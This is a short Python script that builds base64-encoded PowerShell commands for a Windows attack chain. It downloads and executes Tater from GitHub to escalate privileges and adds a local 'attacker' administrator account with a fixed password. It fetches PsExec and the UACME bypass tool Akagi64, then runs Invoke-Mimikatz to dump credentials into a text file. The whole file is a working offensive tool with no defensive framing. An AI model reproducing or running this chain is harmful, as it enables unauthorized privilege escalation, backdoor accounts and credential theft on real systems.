import base64



def cmd_to_base64(cmd):

	temp_cmd = ""
	for char in cmd:
		temp_cmd += char + "\x00"
	base64_cmd = base64.b64encode(temp_cmd)

	return base64_cmd





url_psexec = "https://github.com/jbarg/windows_sec/blob/master/sysinternals_exe/PsExec.exe?raw=true"
url_tater = "https://raw.githubusercontent.com/jbarg/Tater/master/Tater.ps1"
url_mimikatz = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"

url_akagi64 = "https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe?raw=true"


command = "cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc "
# read os proxy config
powershell_command = "$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;"

# priv esc using potato powershell port "tater"
powershell_command += "IEX $browser.DownloadString('" + url_tater + "'); Invoke-Tater -Trigger 1 -Command \"net user attacker Test123! /add\";"
powershell_command += "IEX $browser.DownloadString('" + url_tater + "'); Invoke-Tater -Trigger 1 -Command \"net localgroup administrators attacker /add\";"

# download sysinternals psexec
powershell_command += "IEX $browser.DownloadFile('" + url_psexec + "','C:\\ProgramData\\psexec.exe');"
powershell_command += "IEX $browser.DownloadFile('" + url_akagi64 + "','C:\\ProgramData\\akagi64.exe');"



# run command as user: attacker
command_attacker = ''
command_attacker += "C:\\ProgramData\\akagi64.exe 3 "
command_attacker += "C:\\ProgramData\\psexec -i -s "
command_attacker += "PowerShell.exe -Exec ByPass -Nol -Enc "

admin_cmd = "$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;"
admin_cmd += "IEX $browser.DownloadString('" + url_mimikatz + "'); $result = Invoke-Mimikatz -DumpCreds;"
admin_cmd += "$result | out-file -filepath C:\\programdata\\mimi.txt -append;"

admin_cmd_b64 = cmd_to_base64(admin_cmd)
print "Mimikatz cmd:\n\n"
print command_attacker + " " + admin_cmd_b64 + " > foo.txt"
print "---------------------------------"



powershell_command += "C:\\ProgramData\\psexec.exe /accepteula -i -u attacker -p Test123! " + command_attacker + " " + admin_cmd_b64 + "\""

print "-------------------------------------------------"

command += cmd_to_base64(powershell_command)
print command



print '-'*50
print cmd_to_base64("calc.exe")


